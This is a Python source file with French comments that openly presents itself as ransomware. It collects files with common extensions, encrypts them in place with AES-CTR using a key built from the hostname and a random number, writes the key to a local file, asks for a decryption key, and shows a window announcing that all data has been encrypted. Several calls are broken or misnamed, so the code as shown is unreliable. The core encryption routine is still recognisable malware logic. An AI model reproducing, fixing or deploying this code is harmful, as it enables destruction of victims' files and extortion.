import os
import random
import hashlib
import socket
from tkinter import tkinter
import tkinter as Tkinter

# Importation psycrypt algo de chiffrement de données

from Crypto.Utils import Counter
from Crypto.Cipher import AES
from nt import getlogin

##############################################
#           Corps du ransomware              #
##############################################

username = getlogin()

destination = r'C:\users\user\Desktop'.format(username)

destination = os.path.abspath('')
files = os.listdir(destination)
files = [x for x in files if not x.startswith('.')]

# Ajout d'extension

extensions = [".txt", ".jpeg", ".jpg", ".mp4", ".mp3", ".png"]

def hash_key():
    hashnumber = destination + socket.gethostname() + str(random.randint(0, 10000000000000000))
    hashnumber = hashnumber.encode('utf-8')
    print(hashnumber)
    hashnumber = hashlib.hexdigest() 

    new_key = []

    for k in hashnumber:
        if(len(new_key) == 32):
            hashnumber =  ''.join(new_key)
            break
        else:
            new_key.append(k)

    return hashnumber


def encrypt_and_decrypt(text, crypto, block_size = 16):
    with open(text, 'r+b') as encrypted_file:
        unencrypted_content = encrypted_file.read(block_size)
        while unencrypted_content :
            encrypted_content = crypto(unencrypted_content)
            if len(unencrypted_content) != len(encrypted_content):
                raise ValueError ('')
            
            encrypted_file.seek(- len(encrypted_content), 1)
            encrypted_file.write(encrypted_content)
            unencrypted_content = encrypted_file.read(block_size)


def discover(key):
    files_list = open('files_list', 'w+')

    for extension in extensions:
        for file in files:
            if file.endswith(extension):
                files_list.write(os.path.join(file)+ '\n')

    files_list.close()

    del_space = open('hash_file', 'r')
    del_space = del_space.read().split('\n')
    print(del_space)

    del_space = [i for i in del_space if not i == '']
    print(del_space)

    if os.path.exists('hash_file'):
        decrypt_file = input('Entrez la clé de déchiffrement : ')  

        hash_file = open('hash_file', 'r')

        key = hash_file.read().split('\n')
        key = ''.join(key)

        if decrypt_file == key:
            key = key.encode('utf-8')
            counter = Counter.new(128)
            crypto = AES .new(key, AES.MODE_CTR, counter = counter)

            crypt_files = crypto.decrypt

            for element in del_space: 
                encrypt_and_decrypt(element, crypt_files)

    else: 
        counter = Counter.new(128)
        crypto = AES .new(key, AES.MODE_CTR, counter = counter)

        hash_file = open('hash_file', 'wb')
        hash_file.write(key)
        hash_file.close()

        crypt_files = crypto.decrypt

        for element in del_space:
            encrypt_and_decrypt(element, crypt_files)



def main():
    hashnumber = hash_key()
    print(hashnumber)
    print(len(hashnumber))
    hashnumber = hashnumber.encode('utf-8')
    discover(hashnumber)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()

if __name__ == '__main__':
    def show_about():
        about_window = tkinter.TopLevel(app)

    #Creation de la fenetre
    app = Tkinter.Tk()

    app.geometry("720x480")
    app.minsize(720,480)
    app.config(background='black')
    app.title("Ransomware")

    frame = tkinter.Frame(app, bg = "black")
    label_title = tkinter.Label(app, text = "ransomware", font=("Courrier", 40), bg = "black", fg = 'red')
    label_title.pack()
    label_subtitle = tkinter.Label(app,text = "Toutes vos données ont été chiffrées", font =("Courrier", 40), bg = "black", fg ='red')
    label_subtitle.pack()

    frame.pack(expand = tkinter.YES)
    
    app.mainloop()
    


